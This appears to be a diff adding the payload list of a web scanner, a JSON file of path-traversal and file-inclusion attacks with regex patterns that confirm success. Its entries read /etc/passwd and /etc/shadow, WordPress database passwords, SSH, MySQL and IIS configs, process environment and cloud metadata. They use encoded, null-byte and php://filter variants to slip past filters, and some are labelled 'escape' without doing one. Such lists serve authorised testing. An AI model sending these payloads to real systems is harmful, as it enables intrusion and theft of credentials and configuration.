@@ -1,0 +1,102 @@
+[
+  {
+    "name": "Basic Directory Traversal (Unix)",
+    "path": "../../../../etc/passwd",
+    "pattern": "root:"
+  },
+  {
+    "name": "Basic Directory Traversal (Windows)",
+    "path": "../../../../windows/win.ini",
+    "pattern": "\\[fonts\\]"
+  },
+  {
+    "name": "Null Byte Injection",
+    "path": "../../../../etc/passwd%00",
+    "pattern": "root:"
+  },
+  {
+    "name": "Double Encoding",
+    "path": "..%252f..%252f..%252f..%252fetc%252fpasswd",
+    "pattern": "root:"
+  },
+  {
+    "name": "Container Escape",
+    "path": "../../../../../../../../../../etc/passwd",
+    "pattern": "root:"
+  },
+  {
+    "name": "Apache Tomcat",
+    "path": "/WEB-INF/web.xml",
+    "pattern": "<web-app"
+  },
+  {
+    "name": "PHP Wrapper",
+    "path": "php://filter/convert.base64-encode/resource=index.php",
+    "pattern": "PD9waHA"
+  },
+  {
+    "name": "Windows Shortcut",
+    "path": "../../../../windows/system.ini",
+    "pattern": "\\[drivers\\]"
+  },
+  {
+    "name": "Linux Config",
+    "path": "../../../../etc/shadow",
+    "pattern": "root:"
+  },
+  {
+    "name": "Log Poisoning",
+    "path": "../../../../var/log/apache2/access.log",
+    "pattern": "GET /"
+  },
+  {
+    "name": "Nginx Config",
+    "path": "../../../../etc/nginx/nginx.conf",
+    "pattern": "server \\{"
+  },
+  {
+    "name": "MySQL Config",
+    "path": "../../../../etc/mysql/my.cnf",
+    "pattern": "\\[mysqld\\]"
+  },
+  {
+    "name": "SSH Config",
+    "path": "../../../../etc/ssh/sshd_config",
+    "pattern": "Port 22"
+  },
+  {
+    "name": "PHP Info",
+    "path": "../../../../proc/self/environ",
+    "pattern": "PHP_SELF"
+  },
+  {
+    "name": "WordPress Config",
+    "path": "../../../../wp-config.php",
+    "pattern": "DB_PASSWORD"
+  },
+  {
+    "name": "ASP.NET Web Config",
+    "path": "/web.config",
+    "pattern": "<configuration>"
+  },
+  {
+    "name": "IIS Config",
+    "path": "../../../../windows/system32/inetsrv/config/applicationHost.config",
+    "pattern": "<system.webServer>"
+  },
+  {
+    "name": "Docker Escape",
+    "path": "../../../../../../../../../../../.dockerenv",
+    "pattern": ""
+  },
+  {
+    "name": "Cloud Metadata",
+    "path": "/latest/meta-data/",
+    "pattern": "ami-id"
+  },
+  {
+    "name": "Encoded Traversal",
+    "path": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "pattern": "root:"
+  }
+]
